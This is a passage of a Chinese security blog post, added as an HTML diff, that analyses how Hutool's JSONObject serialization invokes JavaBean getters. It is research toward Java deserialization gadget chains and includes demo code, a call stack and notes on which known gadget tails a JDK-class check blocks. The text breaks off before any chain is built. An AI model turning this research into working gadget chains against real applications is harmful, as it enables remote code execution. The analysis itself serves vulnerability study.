@@ -1,0 +1,836 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="unam4">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x01 简介Hutool是一个功能丰富且易用的Java工具库，通过诸多实用工具类的使用，旨在帮助开发者快速、便捷地完成各类开发任务。 这些封装的工具涵盖了字符串、数字、集合、编码、日期、文件、IO、加密、数据库JDBC、JSON、HTTP客户端等一系列操作， 可以满足各种不同的开发需求。github地址 https:&#x2F;&#x2F;github.com&#x2F;dromara&#x2F;hutool 0x02 测试demo1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hutool序列化分析及gadget浅析">
+<meta property="og:url" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/index.html">
+<meta property="og:site_name" content="unam4">
+<meta property="og:description" content="0x01 简介Hutool是一个功能丰富且易用的Java工具库，通过诸多实用工具类的使用，旨在帮助开发者快速、便捷地完成各类开发任务。 这些封装的工具涵盖了字符串、数字、集合、编码、日期、文件、IO、加密、数据库JDBC、JSON、HTTP客户端等一系列操作， 可以满足各种不同的开发需求。github地址 https:&#x2F;&#x2F;github.com&#x2F;dromara&#x2F;hutool 0x02 测试demo1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125154655056.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125155050616.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125155419991.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125155728295.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125155818338.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125161631577.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125163650836.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125163742722.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125163824333.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125163910646.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125163924346.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125164223418.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125164544382.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125164707597.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125165018000.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125165249895.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125165323841.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125165924271.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125170054145.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125170223657.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125170433728.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125171325587.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125171356632.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125172920415.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125172948428.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125173044585.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125174618090.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125174859482.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125175021881.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125175048477.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125175138760.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125175341607.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125175607923.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125175648313.png">
+<meta property="og:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125180131520.png">
+<meta property="article:published_time" content="2024-11-25T07:39:04.000Z">
+<meta property="article:modified_time" content="2024-11-25T10:43:16.999Z">
+<meta property="article:author" content="unam4">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://unam4.github.io/2024/11/25/hutool%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%8F%8Agadget%E6%B5%85%E6%9E%90/image-20241125154655056.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>hutool序列化分析及gadget浅析 - unam4</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"unam4.github.io","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>unam4&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/01.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="hutool序列化分析及gadget浅析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-11-25 15:39" pubdate>
+          2024年11月25日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          971 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          9 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">hutool序列化分析及gadget浅析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h3><p><code>Hutool</code>是一个功能丰富且易用的<strong>Java工具库</strong>，通过诸多实用工具类的使用，旨在帮助开发者快速、便捷地完成各类开发任务。 这些封装的工具涵盖了字符串、数字、集合、编码、日期、文件、IO、加密、数据库JDBC、JSON、HTTP客户端等一系列操作， 可以满足各种不同的开发需求。github地址 <a target="_blank" rel="noopener" href="https://github.com/dromara/hutool">https://github.com/dromara/hutool</a></p>
+<h3 id="0x02-测试demo"><a href="#0x02-测试demo" class="headerlink" title="0x02 测试demo"></a>0x02 测试demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsonser;<br><br><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> com.utils.utils;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jacksonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Message</span>  &#123;<br>        <span class="hljs-type">int</span> code;<br>        String detail;<br>        Object data;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCode</span><span class="hljs-params">(<span class="hljs-type">int</span> code)</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;setCode&quot;</span>);<br>            <span class="hljs-built_in">this</span>.code = code;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDetail</span><span class="hljs-params">(String detail)</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;setdetail&quot;</span>);<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setData</span><span class="hljs-params">(Object data)</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;setdata&quot;</span>);<br>            <span class="hljs-built_in">this</span>.data = data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;getCode&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.code;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDetail</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;getDetail&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getData</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>            System.out.println(<span class="hljs-string">&quot;getData&quot;</span>);<br><span class="hljs-comment">//            java.lang.Runtime.getRuntime().exec(&quot;open .&quot;);</span><br>            System.out.println(<span class="hljs-built_in">this</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">(<span class="hljs-type">int</span> code, String detail)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">(<span class="hljs-type">int</span> code, String detail, Object data)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>            <span class="hljs-built_in">this</span>.data = data;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>();<br>        utils.setFieldValue(message, <span class="hljs-string">&quot;code&quot;</span>, <span class="hljs-number">1</span>);<br>        utils.setFieldValue(message, <span class="hljs-string">&quot;detail&quot;</span>, <span class="hljs-string">&quot;hello world&quot;</span>);<br>        utils.setFieldValue(message, <span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;data&quot;</span>);<br><br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">objectMapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br><span class="hljs-comment">//        String s = objectMapper.writeValueAsString(message);</span><br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">entries</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        entries.put(<span class="hljs-string">&quot;code&quot;</span>, message);<br><span class="hljs-comment">//        com.alibaba.fastjson.JSON.toJSONString(message);</span><br><br><br><span class="hljs-comment">//        System.out.println(&quot;1&quot;);</span><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>这里编写一个demo(以前复制的，不知道是从枫还是木头大哥哪里复制的)，来测试用hutool的时候，javabean的触发方式 。</p>
+<p><img src="image-20241125154655056.png" srcset="/img/loading.gif" lazyload alt="image-20241125154655056"></p>
+<p>这里看到在使用hutool，json序列化的时候是能触发javabean的getter方法的。所以是不是也可以和jackson或者fastjson一样用来做gadget了？</p>
+<h3 id="0x03-序列化分析"><a href="#0x03-序列化分析" class="headerlink" title="0x03 序列化分析"></a>0x03 序列化分析</h3><p>这里在Message类中，随便找一个getter下断点，进行分析</p>
+<p><img src="image-20241125155050616.png" srcset="/img/loading.gif" lazyload alt="image-20241125155050616"></p>
+<p>完整调用栈</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">getData:<span class="hljs-number">42</span>, jacksonTest$Message (com.jsonser)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>invokeRaw:<span class="hljs-number">1085</span>, ReflectUtil (cn.hutool.core.util)<br>invoke:<span class="hljs-number">1016</span>, ReflectUtil (cn.hutool.core.util)<br>getValue:<span class="hljs-number">155</span>, PropDesc (cn.hutool.core.bean)<br>lambda$copy$<span class="hljs-number">0</span>:<span class="hljs-number">66</span>, BeanToMapCopier (cn.hutool.core.bean.copier)<br>accept:-<span class="hljs-number">1</span>, <span class="hljs-number">1826699684</span> (cn.hutool.core.bean.copier.BeanToMapCopier$$Lambda$<span class="hljs-number">13</span>)<br>forEach:<span class="hljs-number">676</span>, LinkedHashMap (java.util)<br>copy:<span class="hljs-number">48</span>, BeanToMapCopier (cn.hutool.core.bean.copier)<br>copy:<span class="hljs-number">16</span>, BeanToMapCopier (cn.hutool.core.bean.copier)<br>copy:<span class="hljs-number">92</span>, BeanCopier (cn.hutool.core.bean.copier)<br>beanToMap:<span class="hljs-number">737</span>, BeanUtil (cn.hutool.core.bean)<br>mapFromBean:<span class="hljs-number">264</span>, ObjectMapper (cn.hutool.json)<br>map:<span class="hljs-number">114</span>, ObjectMapper (cn.hutool.json)<br>&lt;init&gt;:<span class="hljs-number">210</span>, JSONObject (cn.hutool.json)<br>&lt;init&gt;:<span class="hljs-number">187</span>, JSONObject (cn.hutool.json)<br>wrap:<span class="hljs-number">811</span>, JSONUtil (cn.hutool.json)<br>set:<span class="hljs-number">393</span>, JSONObject (cn.hutool.json)<br>set:<span class="hljs-number">352</span>, JSONObject (cn.hutool.json)<br>put:<span class="hljs-number">340</span>, JSONObject (cn.hutool.json)<br>main:<span class="hljs-number">70</span>, jacksonTest (com.jsonser)<br></code></pre></td></tr></table></figure>
+
+<p>JsonArray类似，都是走JSONUtil.wrap。 那我们直接来看</p>
+<p>cn.hutool.json.JSONUtil#wrap</p>
+<p><img src="image-20241125155419991.png" srcset="/img/loading.gif" lazyload alt="image-20241125155419991"></p>
+<p>这里主要就是判断我们在JSONObject.put进来的对象的原始类型是不是这几个类型。</p>
+<p>我们穿的对象，肯定是不符合上面的几个原始类型，直接看这一行就好。</p>
+<p><img src="image-20241125155728295.png" srcset="/img/loading.gif" lazyload alt="image-20241125155728295"></p>
+<p>看到这里有个判断cn.hutool.core.util.ClassUtil#isJdkClass</p>
+<p><img src="image-20241125155818338.png" srcset="/img/loading.gif" lazyload alt="image-20241125155818338"></p>
+<p>它会判断我们序列化的类是不是jdk的原始类。这里最强的就是clazz.getClassLoader()，我们知道jdk类是不在classload上下文中，这条判断相当于绝杀了。直接把jdbcrow，tempalte，LdapAttribute, SignedObject 等直接杀掉了。这些gadgegt尾巴相当于全部gg。</p>
+<p>是jdk类就直接返回obj.tostrng。不是就实例化一个JSONObject对象</p>
+<p>实例化会调用</p>
+<p>cn.hutool.json.JSONObject#JSONObject(java.lang.Object, cn.hutool.json.JSONConfig, cn.hutool.core.lang.Filter&lt;cn.hutool.core.lang.mutable.MutablePair&lt;java.lang.String,java.lang.Object&gt;&gt;)</p>
+<p><img src="image-20241125161631577.png" srcset="/img/loading.gif" lazyload alt="image-20241125161631577"></p>
+<p>cn.hutool.json.ObjectMapper#map(cn.hutool.json.JSONObject, cn.hutool.core.lang.Filter&lt;cn.hutool.core.lang.mutable.MutablePair&lt;java.lang.String,java.lang.Object&gt;&gt;)</p>
+<p><img src="image-20241125163650836.png" srcset="/img/loading.gif" lazyload alt="image-20241125163650836"></p>
+<p>这里就是获取serializer，我们是希望做gadget的，这里肯定都不符合，直接看最后面就好</p>
+<p><img src="image-20241125163742722.png" srcset="/img/loading.gif" lazyload alt="image-20241125163742722"></p>
+<p><img src="image-20241125163824333.png" srcset="/img/loading.gif" lazyload alt="image-20241125163824333"></p>
+<p><img src="image-20241125163910646.png" srcset="/img/loading.gif" lazyload alt="image-20241125163910646"></p>
+<p><img src="image-20241125163924346.png" srcset="/img/loading.gif" lazyload alt="image-20241125163924346"></p>
+<p>主要判断有没有getter方法，以及fied是不是public。 显然我们肯定是符合的。</p>
+<p>就是就是触发bean到map的过程。</p>
+<p><img src="image-20241125164223418.png" srcset="/img/loading.gif" lazyload alt="image-20241125164223418"></p>
